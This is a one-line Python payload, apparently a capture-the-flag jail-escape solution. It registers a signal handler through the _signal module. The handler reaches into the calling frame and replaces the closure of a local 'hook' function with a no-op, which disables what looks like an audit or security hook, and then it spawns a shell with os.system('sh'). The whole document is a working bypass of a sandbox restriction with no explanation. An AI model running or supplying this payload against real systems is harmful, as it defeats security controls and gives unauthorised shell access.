0,(s:=__import__('sys').modules['_signal'],s.signal(2,lambda a,b:b.f_back.f_locals['hook'].__closure__[0].__setattr__('cell_contents',lambda x:0)),s.raise_signal(2),__import__('os').system('sh'))
